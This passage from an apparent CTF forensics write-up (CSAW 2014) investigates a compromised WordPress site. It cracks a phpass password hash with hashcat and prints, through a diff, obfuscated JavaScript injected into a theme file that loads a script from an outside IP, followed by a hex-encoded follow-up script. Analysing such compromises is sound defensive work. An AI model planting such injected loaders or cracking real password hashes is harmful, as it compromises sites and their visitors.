  &lt;span class="mi"&gt;400&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;phpass&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;MD5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Wordpress&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;MD5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;phpBB3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="mi"&gt;500&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;md5crypt&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;MD5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Unix&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;FreeBSD&lt;/span&gt; &lt;span class="n"&gt;MD5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Cisco&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;IOS&lt;/span&gt; &lt;span class="n"&gt;MD5&lt;/span&gt;
  &lt;span class="mi"&gt;800&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;SHA&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Django&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="p"&gt;(...)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We choose 400 because we are dealing with Wordpress. We copy and paste the hash to a file &lt;em&gt;pass.hash&lt;/em&gt;. Then, we run:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;./hashcat-cli64.bin -m 400 -a 0 -o cracked.txt --remove  pass.hash word_list.txt

Initializing hashcat v0.47 by atom with 8 threads and 32mb segment-size...
&lt;span class="o"&gt;(&lt;/span&gt;...&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;where:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;-m is for --hash-type=NUM&lt;/li&gt;
&lt;li&gt;-a 0: Using a dictionary attack&lt;/li&gt;
&lt;li&gt;cracked.txt is the output file&lt;/li&gt;
&lt;li&gt;word_list.txt is our dictionary&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Now let's take a peak in the output file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;cat cracked.txt
&lt;span class="nv"&gt;$P$BmHbpWPZrjt&lt;/span&gt;.2V8T2xDJfbDrAJZ9So1:fluffybunnies
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;It worked! Our password is &lt;strong&gt;fluffybunnies&lt;/strong&gt;!&lt;/p&gt;
&lt;p&gt;All right, this is a very silly password! It could be easily guessed. If you were the attacker, wouldn't you try this as the first option? OK, maybe right after &lt;em&gt;password&lt;/em&gt; and &lt;em&gt;123456&lt;/em&gt;... :)&lt;/p&gt;
&lt;h4&gt;What we have so far&lt;/h4&gt;
&lt;p&gt;All we have learned from the MySQL dump file was:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;the attacker's motivation,&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;the blog's URL,&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;that the application was in Wordpress,&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;and a password.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Ah,  also that &lt;code&gt;mailserver_login:login@example.com&lt;/code&gt; and &lt;code&gt;mailserver_pass=password&lt;/code&gt;. Talking about security...&lt;/p&gt;
&lt;p&gt;Let's move on.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Inspecting /var/logs/apache2&lt;/h2&gt;
&lt;p&gt;The next item in the list is log inspection. We need wisely choose where to start because there are many of them:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;find . -type f  -name &lt;span class="s1"&gt;&amp;#39;*.log&amp;#39;&lt;/span&gt;
./apache2/error.log
./apache2/access.log
./apache2/other_vhosts_access.log
./fontconfig.log
./boot.log
./gpu-manager.log
./mysql.log
./bootstrap.log
./pm-powersave.log
./kern.log
./mysql/error.log
./alternatives.log
./lightdm/x-0.log
./lightdm/lightdm.log
./casper.log
./auth.log
./apt/term.log
./apt/history.log
./dpkg.log
./Xorg.0.log
./upstart/container-detect.log
./upstart/console-setup.log
./upstart/mysql.log
./upstart/alsa-state.log
./upstart/network-manager.log
./upstart/whoopsie.log
./upstart/procps-virtual-filesystems.log
./upstart/cryptdisks.log
./upstart/systemd-logind.log
./upstart/procps-static-network-up.log
./upstart/alsa-restore.log
./upstart/modemmanager.log
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We start with the Apache's log, because they carry the connection information. If there is any important information in the log files, it should appears in the end, because the attack should be one of the last things that were logged.&lt;/p&gt;
&lt;p&gt;It turned out that &lt;a href="http://en.wikipedia.org/wiki/Tail_(Unix)"&gt;Tailing&lt;/a&gt; the &lt;em&gt;apache&lt;/em&gt; logs did not reveal anything useful. Maybe it is interesting to know that we see the IP &lt;em&gt;192.168.127.137&lt;/em&gt; in the file &lt;em&gt;/apache2/access.log&lt;/em&gt; (which belongs to &lt;em&gt;MASTER OF DISASTER&lt;/em&gt;, as we see above, so &lt;em&gt;hacker&lt;/em&gt; might not be the only attacker...). But we don't have anything really helpful.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Inspecting var/logs/auth.log&lt;/h2&gt;
&lt;p&gt;Considering that the password &lt;strong&gt;fluffybunnies&lt;/strong&gt; was very easy to guess, we are going to take a leap and suppose that this was how the attack was crafted.&lt;/p&gt;
&lt;p&gt;Tailing &lt;code&gt;auth.log&lt;/code&gt; shows something interesting:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;Sep 17 19:18:53 ubuntu sudo:   ubuntu : &lt;span class="nv"&gt;TTY&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;pts/0 ; &lt;span class="nv"&gt;PWD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/home/ubuntu/CSAW2014-WordPress/var/www ; &lt;span class="nv"&gt;USER&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;root ; &lt;span class="nv"&gt;COMMAND&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/bin/chmod -R 775 /var/www/
Sep 17 19:20:09 ubuntu sudo:   ubuntu : &lt;span class="nv"&gt;TTY&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;pts/0 ; &lt;span class="nv"&gt;PWD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/home/ubuntu/CSAW2014-WordPress/var/www ; &lt;span class="nv"&gt;USER&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;root ; &lt;span class="nv"&gt;COMMAND&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/bin/vi /var/www/html/wp-content/themes/twentythirteen/js/html5.js
Sep 17 19:20:55 ubuntu sudo:   ubuntu : &lt;span class="nv"&gt;TTY&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;pts/0 ; &lt;span class="nv"&gt;PWD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/home/ubuntu/CSAW2014-WordPress/var/www ; &lt;span class="nv"&gt;USER&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;root ; &lt;span class="nv"&gt;COMMAND&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/bin/find /var/www/html/ * touch &lt;span class="o"&gt;{}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So someone logged as root:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;downgraded the permissions of &lt;em&gt;/var/www&lt;/em&gt; (755 means read and execute access for everyone and also write access for the owner of the file), and&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;modified a JavaScript file (html5.js) in &lt;em&gt;vi&lt;/em&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;h2&gt;Finding the JavaScript Exploit&lt;/h2&gt;
&lt;p&gt;It looks like an attack to me! Let's &lt;a href="http://linux.die.net/man/1/diff"&gt;diff&lt;/a&gt; this JavaScript file with the original (&lt;a href="http://phpxref.ftwr.co.uk/wordpress/wp-content/themes/twentythirteen/js/html5.js.source.html"&gt;which we can just google&lt;/a&gt;):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;diff html5.js html5_normal.js
93,122d92
&amp;lt; var &lt;span class="nv"&gt;g&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ti&amp;quot;&lt;/span&gt;;
&amp;lt; var &lt;span class="nv"&gt;c&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;HTML Tags&amp;quot;&lt;/span&gt;;
&amp;lt; var &lt;span class="nv"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;. li colgroup br src datalist script option .&amp;quot;&lt;/span&gt;;
&amp;lt; &lt;span class="nv"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; f.split&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;;
&amp;lt; &lt;span class="nv"&gt;c&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;;
&amp;lt; &lt;span class="nv"&gt;k&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/&amp;quot;&lt;/span&gt;;
&amp;lt; &lt;span class="nv"&gt;m&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; f&lt;span class="o"&gt;[&lt;/span&gt;6&lt;span class="o"&gt;]&lt;/span&gt;;
&amp;lt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;var &lt;span class="nv"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 0; i &amp;lt; f.length; i++&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
&amp;lt;     c +&lt;span class="o"&gt;=&lt;/span&gt; f&lt;span class="o"&gt;[&lt;/span&gt;i&lt;span class="o"&gt;]&lt;/span&gt;.length.toString&lt;span class="o"&gt;()&lt;/span&gt;;
&amp;lt; &lt;span class="o"&gt;}&lt;/span&gt;
&amp;lt; &lt;span class="nv"&gt;v&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; f&lt;span class="o"&gt;[&lt;/span&gt;0&lt;span class="o"&gt;]&lt;/span&gt;;
&amp;lt; &lt;span class="nv"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;\&amp;#39;ht&amp;quot;&lt;/span&gt;;
&amp;lt; &lt;span class="nv"&gt;b&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; f&lt;span class="o"&gt;[&lt;/span&gt;4&lt;span class="o"&gt;]&lt;/span&gt;;
&amp;lt; &lt;span class="nv"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 2541 * 6 - 35 + 46 + 12 - 15269;
&amp;lt; c +&lt;span class="o"&gt;=&lt;/span&gt; f.toString&lt;span class="o"&gt;()&lt;/span&gt;;
&amp;lt; &lt;span class="nv"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;56 + 31 + 68 * 65 + 41 - 548&lt;span class="o"&gt;)&lt;/span&gt; / 4000 - 1;
&amp;lt; c +&lt;span class="o"&gt;=&lt;/span&gt; f.toString&lt;span class="o"&gt;()&lt;/span&gt;;
&amp;lt; &lt;span class="nv"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;;
&amp;lt; &lt;span class="nv"&gt;c&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; c.split&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;;
&amp;lt; var &lt;span class="nv"&gt;w&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 0;
&amp;lt; &lt;span class="nv"&gt;u&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;s&amp;quot;&lt;/span&gt;;
&amp;lt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;var &lt;span class="nv"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 0; i &amp;lt; c.length; i++&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
&amp;lt;     &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(((&lt;/span&gt;&lt;span class="nv"&gt;i&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; 3 &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="nv"&gt;i&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; 6&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; w !&lt;span class="o"&gt;=&lt;/span&gt; 2&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="o"&gt;((&lt;/span&gt;&lt;span class="nv"&gt;i&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; 8&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nv"&gt;w&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; 2&lt;span class="o"&gt;))&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
&amp;lt;         f +&lt;span class="o"&gt;=&lt;/span&gt; String.fromCharCode&lt;span class="o"&gt;(&lt;/span&gt;46&lt;span class="o"&gt;)&lt;/span&gt;;
&amp;lt;         w++;
&amp;lt;     &lt;span class="o"&gt;}&lt;/span&gt;
&amp;lt;     f +&lt;span class="o"&gt;=&lt;/span&gt; c&lt;span class="o"&gt;[&lt;/span&gt;i&lt;span class="o"&gt;]&lt;/span&gt;;
&amp;lt; &lt;span class="o"&gt;}&lt;/span&gt;
&amp;lt; &lt;span class="nv"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; k + &lt;span class="s2"&gt;&amp;quot;anal&amp;quot;&lt;/span&gt;;
&amp;lt; document.write&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;lt;&amp;quot;&lt;/span&gt; + m + &lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt; + b + &lt;span class="s2"&gt;&amp;quot;=&amp;quot;&lt;/span&gt; + x + &lt;span class="s2"&gt;&amp;quot;tp:&amp;quot;&lt;/span&gt; + k + k + f + i + &lt;span class="s2"&gt;&amp;quot;y&amp;quot;&lt;/span&gt; + g + &lt;span class="s2"&gt;&amp;quot;c&amp;quot;&lt;/span&gt; + u + v + &lt;span class="s2"&gt;&amp;quot;j&amp;quot;&lt;/span&gt; + u + &lt;span class="s2"&gt;&amp;quot;\&amp;#39;&amp;gt;\&amp;lt;/&amp;quot;&lt;/span&gt; + m + &lt;span class="s2"&gt;&amp;quot;\&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Aha!!! So what is being written?&lt;/p&gt;
&lt;p&gt;In JavaScript, the function &lt;code&gt;document.write()&lt;/code&gt; writes HTML expressions or JavaScript code to a document. However, we can debug it in the console if we want, changing it to &lt;code&gt;console.log()&lt;/code&gt; (and changing any &lt;code&gt;document&lt;/code&gt; word to &lt;code&gt;console&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;To run JavaScript in the console, you need to install &lt;a href="http://nodejs.org/"&gt;Node&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;So we run and we get a URL:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;node html5.js
&amp;lt;script &lt;span class="nv"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;http://128.238.66.100/analytics.js&amp;#39;&lt;/span&gt;&amp;gt;&amp;lt;/script&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Analyzing the Second JavaScript Exploit&lt;/h2&gt;
&lt;p&gt;Awesome, we see a script exploit! Let's get it!&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt; wget http://128.238.66.100/analytics.js
--2014-09-25 19:17:19--  http://128.238.66.100/analytics.js
Connecting to 128.238.66.100:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16072 &lt;span class="o"&gt;(&lt;/span&gt;16K&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;application/javascript&lt;span class="o"&gt;]&lt;/span&gt;
Saving to: ‘analytics.js’

100%&lt;span class="o"&gt;[===============================================================================&lt;/span&gt;&amp;gt;&lt;span class="o"&gt;]&lt;/span&gt; 16,072      --.-K/s   in 0.008s

2014-09-25 19:17:19 &lt;span class="o"&gt;(&lt;/span&gt;2.02 MB/s&lt;span class="o"&gt;)&lt;/span&gt; - ‘analytics.js’ saved &lt;span class="o"&gt;[&lt;/span&gt;16072/16072&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The file turns out to be large, and &lt;em&gt;grep&lt;/em&gt; &lt;em&gt;flag&lt;/em&gt; or &lt;em&gt;key&lt;/em&gt; doesn't show any hit. No IP addresses or URL neither.&lt;/p&gt;
&lt;p&gt;OK, let's take a closer look. We open the file in a text editor and we find a weird hex-encoded variable that is completely unconnected from the rest:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;var&lt;/span&gt; &lt;span class="n"&gt;_0x91fe&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x38\x2E\x32\x33\x38\x2E\x36\x36\x2E\x31\x30\x30\x2F\x61\x6E\x6E\x6F\x75\x6E\x63\x65\x6D\x65\x6E\x74\x2E\x70\x64\x66&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x5F\x73\x65\x6C\x66&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x6F\x70\x65\x6E&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;span class="n"&gt;window&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;_0x91fe&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]](&lt;/span&gt;&lt;span class="n"&gt;_0x91fe&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;_0x91fe&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We decode it using Python or a &lt;a href="http://ddecode.com/hexdecoder/"&gt;online hex-decode&lt;/a&gt; and we get another file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x38\x2E\x32\x33\x38\x2E\x36\x36\x2E\x31\x30\x30\x2F\x61\x6E\x6E\x6F\x75\x6E\x63\x65\x6D\x65\x6E\x74\x2E\x70\x64\x66&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x5F\x73\x65\x6C\x66&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x6F\x70\x65\x6E&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;http://128.238.66.100/announcement.pdf&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;_self&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;open&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Opening the URL leads to this picture:
&lt;img alt="" src="http://i.imgur.com/CNEQhfG.png" /&gt;&lt;/p&gt;
&lt;p&gt;LOL. Funny, but no flag yet...&lt;/p&gt;
&lt;p&gt;It should be in the PDF somewhere!&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Finding the Second Hex-encoded String: Approach I&lt;/h2&gt;
&lt;p&gt;All right, let's use what we learned from the &lt;a href="http://bt3gl.github.io/forensics-200-obscurity.html"&gt;CSAW CTF 2014 Forensic -Obscurity&lt;/a&gt; problem. First, let's see if we find the flag with a simple grep:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$.&lt;/span&gt;/pdf-parser.py announcement.pdf | grep flag
&lt;span class="nv"&gt;$.&lt;/span&gt;/pdf-parser.py announcement.pdf | grep key
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;No luck. Let us ID the file to see if we find any funny stream:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;./pdfid.py announcement.pdf PDFiD 0.1.2 announcement.pdf
 PDF Header: %PDF-1.4
 obj                    9
 endobj                 9
 stream                 4
 endstream              4
 xref                   1
 trailer                1
 startxref              1
 /Page                  1
 /Encrypt               0
 /ObjStm                0
 /JS                    0
 /JavaScript            0
 /AA                    0
 /OpenAction            0
 /AcroForm              0
 /JBIG2Decode           0
 /RichMedia             0
 /Launch                0
 /EmbeddedFile          1
 /XFA                   0
 /Colors &amp;gt; 2^24         0
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Oh, cool, there is a &lt;strong&gt;Embedded File&lt;/strong&gt;! Let's look closer to this object:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;./pdf-parser.py --stats announcement.pdf Comment: 3
XREF: 1
Trailer: 1
StartXref: 1
Indirect object: 9
  2: 3, 7
 /Catalog 1: 6
 /EmbeddedFile 1: 8
 /Filespec 1: 9
 /Page 1: 5
 /Pages 1: 4
 /XObject 2: 1, 2
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Nice. So now we can decode our pdf file using the &lt;strong&gt;object code&lt;/strong&gt;, which we can see  above that is &lt;strong&gt;8&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;./pdf-parser.py --object 8 --raw --filter announcement.pdf
obj 8 0
 Type: /EmbeddedFile
 Referencing:
 Contains stream

  &amp;lt;&amp;lt;
    /Length 212
    /Type /EmbeddedFile
    /Filter /FlateDecode
    /Params
      &amp;lt;&amp;lt;
        /Size 495
        /Checksum &amp;lt;7f0104826bde58b80218635f639b50a9&amp;gt;
      &amp;gt;&amp;gt;
    /Subtype /application/pdf
  &amp;gt;&amp;gt;

 var &lt;span class="nv"&gt;_0xee0b&lt;/span&gt;&lt;span class="o"&gt;=[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;;var &lt;span class="nv"&gt;y&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;_0xee0b&lt;span class="o"&gt;[&lt;/span&gt;0&lt;span class="o"&gt;]&lt;/span&gt;;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Which &lt;em&gt;finally&lt;/em&gt; leads to our flag!&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;YOU&lt;/span&gt; &lt;span class="n"&gt;DID&lt;/span&gt; &lt;span class="n"&gt;IT&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt; &lt;span class="n"&gt;CONGRATS&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt; &lt;span class="n"&gt;fwiw&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;javascript&lt;/span&gt; &lt;span class="n"&gt;obfuscation&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="n"&gt;sofa&lt;/span&gt; &lt;span class="n"&gt;king&lt;/span&gt; &lt;span class="n"&gt;dumb&lt;/span&gt;  &lt;span class="p"&gt;:)&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="n"&gt;Those&lt;/span&gt; &lt;span class="n"&gt;Fluffy&lt;/span&gt; &lt;span class="n"&gt;Bunnies&lt;/span&gt; &lt;span class="n"&gt;Make&lt;/span&gt; &lt;span class="n"&gt;Tummy&lt;/span&gt; &lt;span class="n"&gt;Bumpy&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


